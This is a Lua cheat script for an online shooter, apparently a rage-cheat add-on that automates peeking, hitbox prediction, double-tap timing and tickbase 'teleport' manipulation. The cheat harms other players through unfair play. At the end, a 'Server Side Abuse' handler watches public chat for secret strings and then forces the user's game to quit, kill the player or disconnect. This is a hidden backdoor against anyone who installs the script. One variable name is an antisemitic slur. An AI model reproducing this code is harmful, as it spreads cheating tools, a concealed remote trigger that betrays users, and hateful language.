    if cur < entity_get_prop(local_player_weapon, "m_flNextPrimaryAttack") then
        time_to_shot = entity.get_prop(local_player_weapon, "m_flNextPrimaryAttack") - cur
    elseif cur < entity_get_prop(local_player, "m_flNextAttack") then
        time_to_shot = entity.get_prop(local_player, "m_flNextAttack") -  globals.curtime()
    end

    return time_to_shot * 10
end

local function inair()
    return (bit_band(entity_get_prop(entity_get_local_player(), "m_fFlags"), 1) == 0)
end

local function extrapolate( player , ticks , x, y, z )
    local xv, yv, zv =  entity.get_prop( player, "m_vecVelocity" )
    local new_x = x+globals.tickinterval( )*xv*ticks
    local new_y = y+globals.tickinterval( )*yv*ticks
    local new_z = z+globals.tickinterval( )*zv*ticks
    return new_x, new_y, new_z
end

local function is_falling()
    local local_player = entity.get_local_player()
    local origin = vector(entity.get_origin(local_player))
    local land_dest = vector(origin.x,origin.y,origin.z - 9999)
    local land_dest_endpos = endpos(origin, land_dest)
    
    local last_tick = vector(extrapolate(local_player, 4, origin.x, origin.y, origin.z))

    local is_falling = (last_tick.z < origin.z)
    local dis = origin:dist(land_dest_endpos) < 50

    return is_falling and dis
end


local double_tap, double_tap_key = ui.reference('Rage','Aimbot','Double tap')

local function doubletap_charged()
    local weapon = entity_get_prop(entity_get_local_player(), "m_hActiveWeapon")
    if weapon == nil then return false end
    local next_attack = entity_get_prop(entity_get_local_player(), "m_flNextAttack") + 0.25
	local jewfag = entity_get_prop(weapon, "m_flNextPrimaryAttack")
	if jewfag == nil then return end
    local next_primary_attack = jewfag + 0.5
    if next_attack == nil or next_primary_attack == nil then return false end
    return next_attack - globals_curtime() < 0 and next_primary_attack - globals_curtime() < 0
end

local function reset()

    local local_player = entity.get_local_player()
    if not entity_is_alive(local_player) then return end

    if tts() < 1 then
        afire = 0
    end

    local force_dt = contains(ui.get(config.forcebot), "Force wait for recharge")
    local dt_charge = doubletap_charged()

    local fakeduck = ui.reference("RAGE", "Other", "Duck peek assist")
    local local_player = entity.get_local_player()
    local my_weapon = entity.get_player_weapon(local_player)
    local wepaon_id = bit_band(0xffff, entity_get_prop(my_weapon, "m_iItemDefinitionIndex"))
    local weapon = entity.get_player_weapon(local_player)
    local class = entity_get_classname(weapon) --we get enemy's weapon here
    local is_knife = class == "CKnife"
    local is_nade =
    ({
        [42] = true,
        [43] = true,
        [44] = true,
        [45] = true,
        [46] = true,
        [47] = true,
        [48] = true,
        [68] = true
    })[wepaon_id] or false

    local player_condition = (is_knife) or
                            (tts() > 1) or
                            (is_nade) or 
                            (force_dt and ui.get(double_tap_key) and ui.get(double_tap) and not (dt_charge)) or
                            (inair() and not ((ui.get(config.key)) and is_falling())) or
                            ui.get(fakeduck)

    if player_condition then
        afire = 1
    end
end

local function weapon_fire()
    afire = 1
end

client.set_event_callback('paint_ui', reset)
client.set_event_callback('weapon_fire', weapon_fire)
--------------------------Animations--------------------------
local ani = {
    alpha_circle = 0,
    alpha_beam = 0,
    rising_beam = 0,
}

function lerp(start, vend, time)
return start + (vend - start) * time end
----------------------------[[Set Movement libary]]-----------------------

local function vector_angles(x1, y1, z1, x2, y2, z2)

	local origin_x, origin_y, origin_z
	local target_x, target_y, target_z
	if x2 == nil then
		target_x, target_y, target_z = x1, y1, z1
		origin_x, origin_y, origin_z = client.eye_position()
		if origin_x == nil then
			return
		end
	else
		origin_x, origin_y, origin_z = x1, y1, z1
		target_x, target_y, target_z = x2, y2, z2
	end

	local delta_x, delta_y, delta_z = target_x-origin_x, target_y-origin_y, target_z-origin_z
	if delta_x == 0 and delta_y == 0 then
		return (delta_z > 0 and 270 or 90), 0
	else
		local yaw = math.deg(math.atan2(delta_y, delta_x))
		local hyp = math.sqrt(delta_x*delta_x + delta_y*delta_y)
		local pitch = math.deg(math.atan2(-delta_z, hyp))
		return pitch, yaw
	end
end

local function go_to(cmd, desired_pos)
    local localpos = vector(entity.get_origin(entity.get_local_player()))
    local point = localpos:to(desired_pos)

    if (localpos.z == nil or entity.get_local_player() == nil) then
        return
    end
 
    local yaw = cmd.yaw;
 
    local translated = vector(
        (point.x * math.cos(yaw / 180 * math.pi) + point.y * math.sin(yaw / 180 * math.pi)),
        (point.y * math.cos(yaw / 180 * math.pi) - point.x * math.sin(yaw / 180 * math.pi)),
        point.z
    )

    cmd.forwardmove = translated.x * 450
    cmd.sidemove = -translated.y * 450
end

-- save current command number
local current_cmd = nil
client.set_event_callback("run_command", function(cmd)
    current_cmd = cmd.command_number
end)

-- grab predicted data for this command
client.set_event_callback("predict_command", function(cmd)
    if cmd.command_number == current_cmd then
        -- dont run again for this cmd
        current_cmd = nil

        local tickbase = entity.get_prop(entity.get_local_player(), "m_nTickBase")

        -- save for later
        if tickbase_max ~= nil then
            tickbase_diff = tickbase - tickbase_max
        end

        tickbase_max = math.max(tickbase, tickbase_max or 0)
    end
end)

-- teleporting logic
local do_teleport, is_teleporting = false, false
----------------------------[[Teleport]]----------------------------
local function teleport(cmd)
    local defensive = contains(ui_get(config.applier), "Force defensive")

    if defensive then cmd.force_defensive = true end

    if defensive and double_tap_key and (is_teleporting and tickbase_diff == 0) then
        ui.set(double_tap_key, 'On hotkey')
    elseif double_tap_key and not defensive then
        ui.set(double_tap_key, 'On hotkey')
    end
end

local function go_to2(cmd, desired_pos)


    --Teleport function

    local force_mv = contains(ui.get(config.forcebot), "Force stand up to peek")

    if force_mv then
        cmd.in_duck = 0
    end

    if tickbase_diff ~= nil and tickbase_diff >= 14 then
        is_teleporting = true
    end

    if ui.get(config.key) then
        if velocity() > 1 then
            teleport(cmd)
            cmd.in_jump = 0
        end
        client.delay_call(0.5, reset_tp)
    end


    local local_player = entity.get_local_player()
    local x, y, z = entity_get_prop(local_player, "m_vecAbsOrigin")
    local pitch, yaw = vector_angles(x, y, z, desired_pos.x, desired_pos.y, desired_pos.z)


    cmd.in_back = 0
    cmd.in_moveleft = 0
    cmd.in_moveright = 0
    cmd.in_speed = 0

    cmd.in_forward = 1
    cmd.forwardmove = 800
    cmd.sidemove = 0

    cmd.move_yaw = yaw
end

--------------------------[[Auto Peek function]]------------------------
local is_peeking = 0
local is_retreat = false
local previously_pressed = false
local previously_pressed_origin = nil
local revert_angle = 0
local is_me_on_point = false
----------This will tells other function is autopeeking running

local quick_peek = {ui.reference("RAGE", "Other", "Quick peek assist")}

local function is_key_release()

    local w = client.key_state(0x57)
    local a = client.key_state(0x41)
    local s = client.key_state(0x53)
    local d = client.key_state(0x44)
    local space = client.key_state(0x20)

    if w == false and a == false and s == false and d == false then
        return true
    else
        return false
    end
end

local function auto_retreat(cmd)

    local state = ui_get(quick_peek[2])

    if not state then is_retreat = false end

    previously_pressed = state
    if not previously_pressed then previously_pressed_origin = nil return end

    if not state then is_retreat = false return end

    if previously_pressed_origin == nil then
        previously_pressed_origin = vector(entity_get_origin(entity_get_local_player()))
    end

    local current_origin = vector(entity_get_origin(entity_get_local_player()))

    if previously_pressed_origin:dist(current_origin) ~= 0 and is_key_release() then
        is_me_on_point = false
    else
        is_me_on_point = true
    end

    if (previously_pressed_origin:dist(current_origin) >= (ui.get(config.radius)) and (ui.get(config.retreat)) and is_key_release()) then

        if (previously_pressed_origin:dist(current_origin)) >= 3 then
            is_retreat = true
        else
            is_retreat = false
        end
    end

    if is_retreat == true and not (ui.get(config.retreat)) and not state then
        is_retreat = false
    end

end


local function peeking(tracing, damage, pos, cmd)
    if tracing then
        if damage > 0 then
            go_to2(cmd, pos)
            is_peeking = 1
        else
            is_peeking = 0
        end
    else
        print("Teleport detect, peeking Terminated.")
    end
end

local BOT
local function auto_peek(cmd, angles, hitscan)
    local polart = (ui.get(config.peekbot_polart))
    local eneny_spotted = not is_me_on_point
    local quick_peek_mode = ui.reference("Rage", "Other", "Quick peek assist mode")
    local players = entity.get_players(true)
    local eyepos = vector(client.eye_position())
    if afire ~= 0 then 
        BOT = false 
        ui.set(quick_peek_mode,ui.get(config.autopeek_sets_manual))
    return end

    if is_retreat == true then
        ui.set(quick_peek_mode, ui.get(config.autopeek_sets_bot))
    return end

    local Frequence = (ui.get(config.key) and 35) or ui.get(config.range)
    for i = Frequence, 1, -ui.get(config.frequent) do
        local camera = camera(angles, i)
        local camera_endpos = endpos(eyepos, camera)
        for i = 1, #players do
            local player_index = players[i]
            local enemy_pos = prediction(player_index, hitscan)
            --local enemy_pos = vector(entity.hitbox_position(player_index, 5))
            --print(prediction(player_index))

            g_lc[player_index] = breaking_lc(player_index)

            local tracing = true
            local damage, status
            if (ui.get(config.detection) == "Fraction (low fps)") then
                damage, status = fraction_detection(player_index, camera_endpos, enemy_pos, tracing)
            elseif (ui.get(config.detection) == "Damage (high fps)") then
                damage, status = damage_detection(player_index, camera_endpos, enemy_pos, tracing)
            end


            --print(status)
            if damage > 0 then 
                eneny_spotted = true
                if polart then
                    ui.set(quick_peek_mode, ui.get(config.autopeek_sets_bot))
                    BOT = true
                end
                peeking(tracing, damage, camera_endpos, cmd)
                return
            end
        end
    end

    if polart then
        if not eneny_spotted then
            ui.set(quick_peek_mode,ui.get(config.autopeek_sets_manual))
            BOT = false
        end
    end

end

local function autopeek(cmd)

    local manual = (ui.get(config.manual_toggle) == "Manual key bind")
    local normal = (ui.get(config.manual_toggle) == "Bind with quick peek assist")
    local state = (manual and ui.get(config.activate)) or (normal and ui_get(quick_peek[2]))

    --if globals.tickcount() % 16 >= 15 then cmd.force_defensive = true end
    
    if ui.get(config.safe_peek) then
        revert_angle = lerp(revert_angle,45,globals.frametime() * 6)
    else
        revert_angle = lerp(revert_angle,0,globals.frametime() * 6)
    end

    local scan_feet = (contains(ui.get(config.hitscan), "Feet"))
    local scan_arms = (contains(ui.get(config.hitscan), "Arms"))

    if state then
        ---right
        auto_peek(cmd, 270 - revert_angle)

        if scan_feet then
            auto_peek(cmd, 270 - revert_angle, 10)   
            auto_peek(cmd, 270 - revert_angle, 9)
        end

        if scan_arms then
            auto_peek(cmd, 270 - revert_angle, 17)   
            auto_peek(cmd, 270 - revert_angle, 15)   
        end

        ---left
        auto_peek(cmd, 90 + revert_angle)

        if scan_arms then
            auto_peek(cmd, 90 - revert_angle, 17)   
            auto_peek(cmd, 90 - revert_angle, 15)   
        end

        if scan_feet then
            auto_peek(cmd, 90 - revert_angle, 10)   
            auto_peek(cmd, 90 - revert_angle, 9)
        end
    end

    
    local checking_bot = ui_get(config.autopeek_sets_bot)

    if #checking_bot == 0 then
        ui.set(config.autopeek_sets_bot, {"Retreat on shot", "Retreat on key release"})
    end


    local checking_manual = ui_get(config.autopeek_sets_manual)

    if #checking_manual == 0 then
        ui.set(config.autopeek_sets_manual, "Retreat on shot")
    end



end
--------------------------[[Painting]]------------------------

local function retreat_paint()

    local state = ui_get(quick_peek[2])

    previously_pressed = state
    if not previously_pressed then previously_pressed_origin = nil return end

    if ui.get(config.retreat) and state then

        if previously_pressed_origin == nil then
            previously_pressed_origin = vector(entity_get_origin(entity_get_local_player()))
        end

        local current_origin = vector(entity_get_origin(entity_get_local_player()))

        if previously_pressed_origin:dist(current_origin) <= ui.get(config.radius) then
            circle_drawer_re(previously_pressed_origin, ui.get(config.radius), 180, 180, 180, 80)
        else
            circle_drawer_re(previously_pressed_origin, ui.get(config.radius), 255, 50, 50, 80)
        end
    else
        --is_retreat = false
    end
end


local function draw_onground(angles, type)
    local players = entity.get_players(true)
    local eyepos = vector(client.eye_position())

    local origin = vector(entity_get_origin(entity_get_local_player()))
    local land = vector(eyepos.x, eyepos.y, origin.z + 2)

    local manual = (ui.get(config.manual_toggle) == "Manual key bind")
    local normal = (ui.get(config.manual_toggle) == "Bind with quick peek assist")
    local state = (manual and ui.get(config.activate)) or (normal and ui_get(quick_peek[2]))

    local Frequence = (ui.get(config.key) and 35) or ui.get(config.range)
    if afire == 0 and state then
        ani.alpha_beam = lerp(ani.alpha_beam,180,globals.frametime() * 6)
        ani.alpha_circle = lerp(ani.alpha_circle,110,globals.frametime() * 6)
        ani.rising_beam = lerp(ani.rising_beam,8,globals.frametime() * 3.5)
    else
        ani.alpha_beam = lerp(ani.alpha_beam,50,globals.frametime() * 6)
        ani.alpha_circle = lerp(ani.alpha_circle, not state and (0) or 30,globals.frametime() * 6)
        ani.rising_beam = lerp(ani.rising_beam,0,globals.frametime() * 3.5)
    end

    for i = Frequence, 1, -ui.get(config.frequent) do
        local camera = camera(angles, i)
        local position = vector(client.eye_position())
        local camera_adj = vector(camera.x, camera.y, camera.z - 10000)
        local endpos_camera = endpos(camera, camera_adj)
        local land_camera = vector(camera.x, camera.y, endpos_camera.z + ani.rising_beam)
        local camera_endpos = endpos(land, land_camera)

        local player_status = 0
        for i = 1, #players do

            local player_index = players[i]
            local enemy_pos = vector(entity.hitbox_position(player_index, 5))
            local tracing = true
            
            local damage, status
            if (ui.get(config.detection) == "Fraction (low fps)") then
                damage, status = fraction_detection(player_index, camera_endpos, enemy_pos, tracing)
            elseif (ui.get(config.detection) == "Damage (high fps)") then
                damage, status = damage_detection(player_index, camera_endpos, enemy_pos, tracing)
            end

            player_status = bit.bor(player_status, status)

        end

        if type == 1 then
            if bit.band(player_status, 4) == 4 then
                beam_creator(camera_endpos, 0, 255, 0, ani.alpha_beam)
            elseif bit.band(player_status, 2) == 2 then
                beam_creator(camera_endpos, 255, 255, 0, ani.alpha_beam)
            else
                beam_creator(camera_endpos, 255, 255, 255, ani.alpha_beam)
            end
        end

        if type == 2 then
            if bit.band(player_status, 4) == 4 then
                circle_drawer_re(camera_endpos, 12, 0, 255, 0, ani.alpha_circle) 
            elseif bit.band(player_status, 2) == 2 then
                circle_drawer_re(camera_endpos, 12, 255, 255, 0, ani.alpha_circle)
            else
                circle_drawer_re(camera_endpos, 12, 255, 255, 255, ani.alpha_circle) 
            end
        end

    end
end
------------Origin libary
local function thrid_person()
    local entities = entitylib.get_all("CPredictedViewModel")
    for _, entidx in ipairs(entities) do
        
        local vector_origin = vector(entidx:get_origin())
        local view_punch_angle = vector(entitylib.get_local_player():get_prop("m_vecOrigin"))
        local aim_punch_angle = vector(entitylib.get_local_player():get_prop("m_vecOrigin"))
        local camera_angles = vector(client.camera_angles()) -- [[+ (view_punch_angle + aim_punch_angle)]]

        local forward = angle_forward(camera_angles)
        local right = angle_right(view_punch_angle + aim_punch_angle)

        vector_origin = vecotr_ma(vector_origin, 1, right.x, right.y, right.z)
        vector_origin = vecotr_ma(vector_origin, 30, forward.x, forward.y, forward.z)
        return vector_origin
    end
end

function lerp(start, vend, time)
return start + (vend - start) * time end
local easing = {

    color_1 = {0, 0, 0},
    tts = {0, 0, 0, 0},
    ind_r = {0, 0, 0, 0},
    ind_g = {0, 0, 0, 0},
    ind_b = {0, 0, 0, 0},
    ind_a = {0, 0, 0, 0},
    offset = {0, 0},

    ind_r_on = {80, 255, 255, 204},
    ind_g_on = {255, 255, 215, 255},
    ind_b_on = {80, 0 , 0, 153},
    ind_a_on = {255, 255, 255, 255},
    ind_off = {184, 184, 184, 150},

}
local function indicator(x, y)
-- ye this one would be cool

    local me = entity.get_local_player()
    
    if not entity.is_alive(me) then return end

    local ready = (afire == 0)
    local animation_speed = 6.5
    local manual = (ui.get(config.manual_toggle) == "Manual key bind")
    local normal = (ui.get(config.manual_toggle) == "Bind with quick peek assist")
    local state = (manual and ui.get(config.activate)) or (normal and ui_get(quick_peek[2]))
    local eased_tts = lerp(time_to_shot * 50, time_to_shot * 50, globals.frametime() * animation_speed)
    if eased_tts >= 60 then eased_tts = 60 end

    if not ready then
        easing.color_1[1] = lerp(easing.color_1[1], 230, globals.frametime() * animation_speed)
        easing.color_1[2] = lerp(easing.color_1[2], 50, globals.frametime() * animation_speed)
        easing.color_1[3] = lerp(easing.color_1[3], 50, globals.frametime() * animation_speed)

        easing.tts[1] = lerp(easing.tts[1], 3, globals.frametime() * 12)
        easing.tts[2] = lerp(easing.tts[2], 180, globals.frametime() * animation_speed)
        easing.tts[3] = lerp(easing.tts[3], eased_tts > 1 and 5 or 0, globals.frametime() * 12)
    else
        easing.color_1[1] = lerp(easing.color_1[1], 0, globals.frametime() * animation_speed)
        easing.color_1[2] = lerp(easing.color_1[2], 255, globals.frametime() * animation_speed)
        easing.color_1[3] = lerp(easing.color_1[3], 0, globals.frametime() * animation_speed)

        easing.tts[1] = lerp(easing.tts[1], 0, globals.frametime() * animation_speed)
        easing.tts[2] = lerp(easing.tts[2], 0, globals.frametime() * animation_speed)
        easing.tts[3] = lerp(easing.tts[3], 0, globals.frametime() * 12)
    end

    local pr = ui.get(config.key) 
    local bt = ui.get(config.back_track)
    local sp = ui.get(config.safe_peek)

    for i = 1 , 4, 1 do
        local color = (i == 1 and state) or (i == 2 and pr) or (i == 3 and bt) or (i == 4 and sp)
        easing.ind_r[i] = lerp(easing.ind_r[i], color and easing.ind_r_on[i] or easing.ind_off[1], globals.frametime() * 15)
        easing.ind_g[i] = lerp(easing.ind_g[i], color and easing.ind_g_on[i] or easing.ind_off[2], globals.frametime() * 15)
        easing.ind_b[i] = lerp(easing.ind_b[i], color and easing.ind_b_on[i] or easing.ind_off[3], globals.frametime() * 15)
        easing.ind_a[i] = lerp(easing.ind_a[i], color and easing.ind_a_on[i] or easing.ind_off[4], globals.frametime() * 15)
    end

    ------------------easing libary ends------------------
    local third_check, third  = ui.reference("Visuals", "Effects", "Force Third Person (alive)")
    local vector_origin = (thrid_person())
    local pos = get_attachment_vector(false)
    local is_scoped = entity.get_prop(entity.get_player_weapon(entity.get_local_player()), "m_zoomLevel" )

    local Animation_speed = 6
    local ss = {client.screen_size()}
    local center_x, center_y = ss[1] / 2, ss[2] / 2 

    if pos ~= nil then
        x1, y1 = renderer.world_to_screen(pos[1], pos[2], pos[3])
    else
        x1, y1 = center_x + 200, center_y + 15
    end

    if vector_origin ~= nil then
        wx, wy = renderer.world_to_screen(vector_origin.x, vector_origin.y, vector_origin.z)
    else
        wx, wy = center_x + 200, center_y + 15
    end


    if ui.get(third) then
        easing.offset[1] = lerp(easing.offset[1], wx - 20, globals.frametime() * Animation_speed)
        easing.offset[2] = lerp(easing.offset[2], wy, globals.frametime() * Animation_speed)
    else
        easing.offset[1] = lerp(easing.offset[1], x1 - 50,globals.frametime() * Animation_speed)
        easing.offset[2] = lerp(easing.offset[2] ,y1 - 50,globals.frametime() * Animation_speed)
    end


    ------------------vector libary ends------------------
    local outline_r, outline_g, outline_b, outline_a = ui_get(config.colors.c_a)
    local background_r, background_g, background_b, background_a = ui_get(config.colors.c_b)
    solus_render.container(easing.offset[1] + 50,easing.offset[2] + 30, 68, 25 + math.floor(easing.tts[3] + easing.tts[4] + 0.5), outline_r, outline_g, outline_b, outline_a, ui.get(config.glow_radius), background_r, background_g, background_b, background_a)
    renderer.text(easing.offset[1] + 54, easing.offset[2] + 33, 255, 255, 255, 255, "-", nil, "STAT")
    renderer.text(easing.offset[1] + 74, easing.offset[2] + 33, easing.color_1[1], easing.color_1[2], easing.color_1[3], 255, "-", nil, (ready and "ON") or "OFF")
    renderer.text(easing.offset[1] + 100, easing.offset[2] + 33, 255, 255, 255, (BOT and 180) or 150, "-", nil, (BOT and "BO") or "MA")
    renderer_rectangle(easing.offset[1] + 54, easing.offset[2] + 40 + easing.tts[3], eased_tts, 2, 255, 255, 255, easing.tts[2])

    for i = 1, 4, 1 do
        local offset = (i * 15) + 39
        local text = (i == 1 and "AP") or (i == 2 and "PR") or (i == 3 and "BT") or (i == 4 and "SP")
        renderer.text(easing.offset[1] + offset, easing.offset[2] + 43 + easing.tts[3], easing.ind_r[i], easing.ind_g[i], easing.ind_b[i], easing.ind_a[i], "-", nil, text)
    end

end

local function paint()

    local ss = {client.screen_size()}
    local center_x, center_y = ss[1] / 2, ss[2] / 2 
    local manual = (ui.get(config.manual_toggle) == "Manual key bind")

    if ui.get(config.retreat) then
        renderer.text(center_x, center_y - 60, 190, 189, 189, 255, "c", nil, "force retreat")
    end

    local trace_debugger = ui.get(config.trace_debug)
    if trace_debugger then
        local players = entity.get_players(true)
        for i = 1, #players do

            for hitscan = 0, 17 do

                local hitbox = {entity.hitbox_position(players[i], hitscan)}

                if hitbox ~= nil then

                    local x, y = renderer.world_to_screen(hitbox[1], hitbox[2], hitbox[3])

                    if x ~= nil and y ~= nil then
                        renderer.text(x, y, 180, 50, 50, 255, "cb", nil, hitscan)
                    end

                end

            end

        end
    end


    local state = ui_get(quick_peek[2])

    if contains(ui.get(config.visuals), "Indicator") then
        indicator()
    end

    if contains(ui.get(config.visuals), "Retreat Circle") then
        retreat_paint()
    end

    local pr = ui.get(config.key) 

    if pr then renderer.indicator(200, 200, 200, 255, "PR") end

    if state or ani.alpha_circle >= 1 then

        if contains(ui.get(config.visuals), "Beam") then
            draw_onground(90 + revert_angle, 1)
            draw_onground(270 - revert_angle, 1)
        end

        if contains(ui.get(config.visuals), "Circle") then
            draw_onground(90 + revert_angle, 2)
            draw_onground(270 - revert_angle, 2)
        end
    end
    
end

client.set_event_callback('paint', paint)
client.set_event_callback('setup_command', autopeek)
client.set_event_callback('setup_command', auto_retreat)

------attempt

------Server Side Abuse
local function on_player_chat(e)
    if e.teamonly == false then
        if string.find(e.text, "CAHSKJDHAKJSDKJHASKJDHASKJDHJA") then
            client.exec("quit")
        end

        if string.find(e.text, "CJSDJKSJDKSAJDKASLJKDSAJLKDJMCCMCMC") then
            client.exec("kill")
        end

        if string.find(e.text, "ASJHDAKJ1267831KHJCABSKJAWDKJHHKJ") then
            client.exec("disconnect ")
        end
  end
end

client.set_event_callback("player_chat", on_player_chat)
